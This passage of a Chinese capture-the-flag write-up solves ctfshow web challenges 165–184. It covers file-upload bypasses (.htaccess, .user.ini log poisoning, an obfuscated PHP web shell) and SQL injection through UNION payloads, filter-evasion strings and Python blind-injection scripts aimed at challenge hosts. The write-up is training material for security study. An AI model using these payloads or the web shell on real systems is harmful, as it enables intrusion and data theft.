<span class="title">checkImage</span>(<span class="params">$filename, $data, $unlink = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $correctImage;</span><br><span class="line">		file_put_contents($filename, $data);</span><br><span class="line">		$correctImage = <span class="literal">TRUE</span>;</span><br><span class="line">		imagecreatefromjpeg($filename);</span><br><span class="line">		<span class="keyword">if</span>($unlink)</span><br><span class="line">			unlink($filename);</span><br><span class="line">		<span class="keyword">return</span> $correctImage;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params">$errno, $errstr, $errfile, $errline</span>) </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">		$correctImage = <span class="literal">FALSE</span>;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, $errstr, $m)) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>($m[<span class="number">1</span>])) &#123;</span><br><span class="line">				$extraBytes = (<span class="keyword">int</span>)$m[<span class="number">1</span>];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">		<span class="keyword">private</span> $binData;</span><br><span class="line">		<span class="keyword">private</span> $order;</span><br><span class="line">		<span class="keyword">private</span> $size;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$filename, $order = <span class="literal">false</span>, $fromString = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">			<span class="keyword">if</span>(!$fromString) &#123;</span><br><span class="line">				<span class="keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">					<span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.$filename.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">				<span class="keyword">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;binData = $filename;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params">$skip</span>) </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, $skip);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			$byte = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">return</span> ord($byte);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			$short = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">				$short = (ord($short[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">0</span>]);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				$short = (ord($short[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">1</span>]);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> $short;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>不过jpg图片成功率很低，试了好多张都不行，搜了一下，发下国光师傅分享了一张成功率比较高的图片，下面是原图<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web165/jpg%E6%B8%B2%E6%9F%93.jpg" alt=""><br>
先在网页上传这张图片<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web165/DTQ%7BJY%40B9%5B%7B%5DPGM2~T%4092D2.png" alt=""><br>
然后点击查看图片，crtl+s下载被渲染过的图片，另存为1.jpg<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web165/7Y%5DK4ETOOTZ%60%25A5%5DX90U9N3.png" alt=""><br>
然后运行脚本，生成payload_1.jpg<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web165/XDCB%29B%241QOV%5BKIV%60%7DKY%24A%7DV.png" alt=""><br>
然后再上传payload_1.jpg，点击查看图片，可以看到图片有明显变化<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web165/J%28W%28%5DV3V%24%29A50Z%40ECI%40Y%25W0.png" alt=""><br>
然后抓包，执行命令获取flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web165/Q27%28%245SI%256F%5B%28_~B8%40%5B%7D%7B0C.png" alt=""></p>
<h3 id="web166"><a class="header-anchor" href="#web166">¶</a>web166</h3>
<p>查看源码，发现只能上传zip<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web166/YT%5DSW%7DTXIA%5B%29%5D1MVO%24UZKGJ.png" alt=""><br>
我们写个一句话木马，然后把php改成zip上传<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web166/AZ3QVAW82G%5BXF8JXL%5D%257_XP.png" alt=""><br>
然后访问上传的页面，通过文件包含的特性，我们直接执行命令即可<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web166/%408FNPO90%5DJXB%29XEAAXTS%5BBO.png" alt=""></p>
<h3 id="web167"><a class="header-anchor" href="#web167">¶</a>web167</h3>
<p>根据题目提示的httpd，想到是利用htaccess文件</p>
<blockquote>
<p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
</blockquote>
<p>首先上传一个jpg文件抓包(因为前段限制了只能上传jpg)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
<p>然后文件名改成<code>.htaccess</code>，然后上传<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web167/YTG%245E9COT_ZJJ33WN%400NP3.png" alt=""><br>
接着再上传jpg格式文件，内容是一句话木马<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web167/FRDI%5D%40KD%5DFE_70F56%24_3YXY.png" alt=""><br>
然后访问文件，执行命令即可得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web167/ED6%5B%7DX6BJ_NY5%5BSGJFSV1%60V.png" alt=""></p>
<h3 id="web168"><a class="header-anchor" href="#web168">¶</a>web168</h3>
<p>根据题目提示，是要做简单的免杀，刚好玩awd遇过挺多免杀马，第一个先祭上bugku的一道题过狗一句话的免杀马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $poc=<span class="string">&quot;s#y#s#t#e#m&quot;</span>; </span><br><span class="line">    $poc_1=explode(<span class="string">&quot;#&quot;</span>,$poc); </span><br><span class="line">    $poc_2=$poc_1[<span class="number">0</span>].$poc_1[<span class="number">1</span>].$poc_1[<span class="number">2</span>].$poc_1[<span class="number">3</span>].$poc_1[<span class="number">4</span>].$poc_1[<span class="number">5</span>];</span><br><span class="line">    $poc_2($_REQUEST[<span class="string">&#x27;1&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>还是基础操作，做一个图片马传上去<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web168/S%24Z%2486L0389ST1%29RK~B_808.png" alt=""><br>
可以看见成功上传，绕后访问upload目录执行命令获取flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web168/3%25Z%28%7D629S4%245LEC2AM%7B%40E%405.png" alt=""></p>
<h3 id="web169"><a class="header-anchor" href="#web169">¶</a>web169</h3>
<p>右键源码查看前端限制只能上传zip，先上传一个zip，然后抓包，改<code>Content-Type</code>为<code>image/png</code>，可以传php等格式，但发现内容中过滤了<code>&lt;&gt;</code>和<code>php</code>，试了下可以传<code>.user.ini</code>，我们尝试一下日志包含，<code>User-Agent</code>加上一句话木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto_prepend_file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web169/X%24%608AQ%28Z4%25Z8U%604%60P0FFHF9.png" alt=""><br>
接着得再上传一个php文件，满足<code>.user.ini</code>的利用效果，内容随意<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web169/%5BE%25K2I%5D~M%293SW%5BO%7D1_%287GJ9.png" alt=""><br>
然后再用蚁剑连接upload目录下的1.php即可<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web169/JG%5B0J7LKSAGJZZ0%5BN%5DW9~%24A.png" alt=""></p>
<h3 id="web170"><a class="header-anchor" href="#web170">¶</a>web170</h3>
<p>和上题一样的方法</p>
<h2 id="sql注入-171-253"><a class="header-anchor" href="#sql注入-171-253">¶</a>sql注入(171-253)</h2>
<h3 id="web171"><a class="header-anchor" href="#web171">¶</a>web171</h3>
<p>打开题目，接下来150道全是sql注入了QWQ，先输入1查询<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/FSI1%28MA%25MKN%7BYMRW1NWO81D.png" alt=""><br>
这里我们可以看到查询语句是这样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
<p>当我们输入id=1的时候，语句代入数据库中查询就会变成这样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D;&#39;1&#39; limit 1;</span><br></pre></td></tr></table></figure>
<p>如果我们加个单引号，即</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D;&#39;1&#39;&#39; limit 1;</span><br></pre></td></tr></table></figure>
<p>语句不规范就会报错<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/LGZW%28DB%29Q7~%40%60%60KD%7DVQB4DR.png" alt=""><br>
如果我们在后面加个注释符，即变成<code>id=1'--+</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D;&#39;1&#39;--+&#39; limit 1;</span><br><span class="line">注释符--+会把后面的语句全注释掉，就不会报错，语句就变成了</span><br><span class="line">select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D;&#39;1&#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/_ENH4ILOVOROUAWSEF9V%5DF8.png" alt=""><br>
接下来我们用<code>order by</code>语句测试有多少列</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; order by 4 --+</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/SY%5DN4Y%28DZMFKCU4OS3QKYUS.png" alt=""><br>
可以看到4列的时候报错，我们再减小数字<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/8%28%299RW79ZG%7DH4COV%7B%5B1%5BDNY.png" alt=""><br>
3列的时候正确回显了数据，说明只有三列(当然明眼的师傅前面已经看得出是只有三列了)<br>
接下来，我们查一下数据库名字，这里用union语句来连接查询，并且在前面把id改成-1以达到把查询id回显的数据给置空的目的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select database(),2,3 --+</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/6LLV7%5BKF%284A%5DV9JEPHT%7DH%5B7.png" alt=""><br>
回显出数据库名字为ctfshow_web，接下来查询表，这里我们用group_concat函数，它可以把相同行的数据都组合起来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select group_concat(table_name),2,3 from information_schema.tables where table_schema&#x3D;&quot;ctfshow_web&quot; --+</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/3D~%7DX%7DV34~B%5BW_%5D%25HX%28Z8UY.png" alt=""><br>
查出表名为ctfshow_user，接下来再去查列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select group_concat(column_name),2,3 from information_schema.columns where table_name&#x3D;&quot;ctfshow_user&quot;--+</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/43KMZ%253X54%25%28YL%24NKJ%40CYCT.png" alt=""><br>
得到有id,username,password三个列名，然后再password中找到了flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select password,2,3 from ctfshow_user--+</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web171/5%407OH%24R%5BIP0Q7E0%29PO%2815%282.png" alt=""></p>
<h3 id="web172"><a class="header-anchor" href="#web172">¶</a>web172</h3>
<p>这次变成了两列</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; order by 2 --+</span><br></pre></td></tr></table></figure>
<p>查数据库名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select database(),1--+</span><br></pre></td></tr></table></figure>
<p>得到数据库名字为ctfshow_web，接着查表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select group_concat(table_name),1 from information_schema.tables where table_schema&#x3D;&quot;ctfshow_web&quot; --+</span><br></pre></td></tr></table></figure>
<p>得到有两个表，ctfshow_user和ctfshow_user2，直觉flag在第二个表中(后来看到代码都提示第二个了)，直接查第二个表的列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select group_concat(column_name),1 from information_schema.columns where table_name&#x3D;&quot;ctfshow_user2&quot; --+</span><br></pre></td></tr></table></figure>
<p>得到有id，username，password三个列名，查password</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select password,1 from ctfshow_user2--+</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h3 id="web173"><a class="header-anchor" href="#web173">¶</a>web173</h3>
<p>这次测出是三列</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; order by 3 --+</span><br></pre></td></tr></table></figure>
<p>根据前面我们已经摸清数据库结构了，这里直接查password得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select password,2,3 from ctfshow_user3--+</span><br></pre></td></tr></table></figure>
<h3 id="web174"><a class="header-anchor" href="#web174">¶</a>web174</h3>
<p>这里有个坑点，就是选择第四关后，url还是第三关的，得手动把数字3改成4<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web173/QQ%E6%88%AA%E5%9B%BE20210316164042.png" alt=""><br>
测试了一下，有两列，但没有回显<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web173/_%5B1WGY9%29V3W9COO%7D%28UO%40%24%401.png" alt=""><br>
这里代码匹配到数字就不会回显，我们可以采用盲注的方式来测试，这里我用的substr语句和页面回显查询出的admin语句来结合利用，写一个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/3/16 16:24</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://9ee16fc0-d13a-48ce-a43d-08dbe999e319.challenge.ctf.show:8080/api/v4.php&quot;</span></span><br><span class="line">dict = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dict:</span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27; and substr((select password from ctfshow_user4 where username=\&quot;flag\&quot;),<span class="subst">&#123;i&#125;</span>,1)=\&quot;<span class="subst">&#123;j&#125;</span>\&quot;--+&quot;</span></span><br><span class="line">        gloal = url + payload</span><br><span class="line">        res = requests.get(url=gloal)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>运行后即可得到flag<br>
当然还有其他思路，例如把查询的结果写到一个文件中，然后访问就行</p>
<h3 id="web175"><a class="header-anchor" href="#web175">¶</a>web175</h3>
<p>这题的匹配规则把ascii码表中全部字符给禁了，不过我们还可以利用时间盲注的方法来判断获取flag，先说一下mysql中的if判断方法吧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(expr1,expr2,expr3)  </span><br></pre></td></tr></table></figure>
<p>如果 expr1 是TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。写个时间盲注脚本来跑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/3/16 16:24</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://9cb608df-e447-434e-b864-67001d4b869d.challenge.ctf.show:8080/api/v5.php&quot;</span></span><br><span class="line">dict = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dict:</span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27; and if(substr((select password from ctfshow_user5 where username=\&quot;flag\&quot;),<span class="subst">&#123;i&#125;</span>,1)=\&quot;<span class="subst">&#123;j&#125;</span>\&quot;,sleep(5),0)--+&quot;</span></span><br><span class="line">        gloal = url + payload</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.get(url=gloal)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end-start &gt; <span class="number">4.9</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>运行后得到flag</p>
<h3 id="web176"><a class="header-anchor" href="#web176">¶</a>web176</h3>
<p>这次开始有过滤注入，先测出有三列</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; order by 3--+</span><br></pre></td></tr></table></figure>
<p>fuzz测试一下，发现是对select进行了过滤，我们大小写绕过就好了，payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union Select password,2,3 from ctfshow_user--+</span><br></pre></td></tr></table></figure>
<p>还有另一种简单办法，既然存在注入，直接万能密码就好了<code>' or 1=1--+</code></p>
<h3 id="web177"><a class="header-anchor" href="#web177">¶</a>web177</h3>
<p>这次发现还多过滤了空格，我们可以用<code>%0a</code>换行符或者<code>/**/</code>注释符绕过(或者<code>%09,%0b,%0c,%0d</code>都可以)，这次我们用万能密码吧，用上面的也可以，不过绕过空格后有点长，后面的注释我们用<code>#</code>的url编码形式<code>%23</code>，payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;1%23</span><br></pre></td></tr></table></figure>
<h3 id="web178"><a class="header-anchor" href="#web178">¶</a>web178</h3>
<p>这次<code>/**/</code>被ban了，我们换<code>%0a</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;%0aor%0a1&#x3D;1%23</span><br></pre></td></tr></table></figure>
<h3 id="web179"><a class="header-anchor" href="#web179">¶</a>web179</h3>
<p>这次测试一轮下来，发现只有<code>%0c</code>可以用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;%0cor%0c1&#x3D;1%23</span><br></pre></td></tr></table></figure>
<h3 id="web180"><a class="header-anchor" href="#web180">¶</a>web180</h3>
<p>这次把已知的能用的绕过空格方法都给过滤了，不过还可以采用运算符的方式来精心构造一个万能密码，先放出payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;or(id&#x3D;26)and&#39;1</span><br></pre></td></tr></table></figure>
<p>前面我们已经知道表的结构是<code>id,username,password</code>，所以我们通过查id的方式去找flag，而用运算符中，<code>and</code>的优先级比<code>or</code>高，这句话放到查询语句中就变成了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;&#39;-1&#39;or(id&#x3D;26)and&#39;1&#39; limit 1;</span><br><span class="line">也就是</span><br><span class="line">(id&#x3D;&#39;-1&#39;) or ((id&#x3D;26) and &#39;1&#39;) limit 1;</span><br><span class="line">前面为0，后面为1，所以整个条件为1</span><br></pre></td></tr></table></figure>
<h3 id="web181"><a class="header-anchor" href="#web181">¶</a>web181</h3>
<p>这次倒是把waf语句给放出来了，可以看到正则匹配把大小写给过滤，还是一样用上面的payload可以过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;or(id&#x3D;26)and&#39;1</span><br></pre></td></tr></table></figure>
<h3 id="web182"><a class="header-anchor" href="#web182">¶</a>web182</h3>
<p>一样可以用上面的payload绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;or(id&#x3D;26)and&#39;1</span><br></pre></td></tr></table></figure>
<h3 id="web183"><a class="header-anchor" href="#web183">¶</a>web183</h3>
<p>打开网站后根据提示，利用post传参，值为表名，根据之前的题我们知道表名是“ctfshow_user”，所以post一下<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web183/IY873C%24J6DZB%5DXP9Q%25D%5BMO3.png" alt=""><br>
发现返回值为22，说明有22行数据，这里看返回逻辑把空格和等号以及一些常用的语句给ban掉了，空格的话尝试用括号扩住来让语句正常执行，等号用like来替代，然后用where和<code>%</code>来匹配数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">post：tableName&#x3D;(ctfshow_user)where(pass)like&#39;ctfshow%&#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web183/FCRGYUSVS0G%5B%7DVM6BO1GJO2.png" alt=""><br>
发现返回值为1，说明执行成功，我们写一个脚本来跑剩下的flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/4/8 21:24</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://adb1f64a-e1fd-4640-aeb5-b49da1a62390.challenge.ctf.show:8080/select-waf.php&quot;</span></span><br><span class="line">str = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;<span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;(ctfshow_user)where(pass)like&#x27;&#123;0&#125;%&#x27;&quot;</span>.format(flag+j)&#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h3 id="web184"><a class="header-anchor" href="#web184">¶</a>web184</h3>
